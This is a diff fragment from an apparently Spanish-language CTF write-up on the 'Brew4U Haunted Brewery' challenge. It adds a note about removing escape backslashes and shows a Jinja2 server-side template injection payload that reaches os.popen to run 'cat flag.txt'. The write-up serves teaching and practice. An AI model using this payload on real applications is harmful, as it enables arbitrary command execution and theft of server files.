@@ -23,7 +23,7 @@ Si enviamos dicha cadena, efectivamente recibimos un error:
 
 ![Image]({{ site.baseurl }}/images/posts/2024-11-04-Brew4U-Haunted-Brewery-CTF-3.png)
 
-De forma, que con un input como el siguiente, se nos dará la flag:
+De forma, que con un input como el siguiente (sin las `\\`), se nos dará la flag:
 
 ```
 \{\{ self._TemplateReference\_\_context.cycler.\_\_init\_\_.\_\_globals\_\_.os.popen('cat flag.txt').read() \}\}
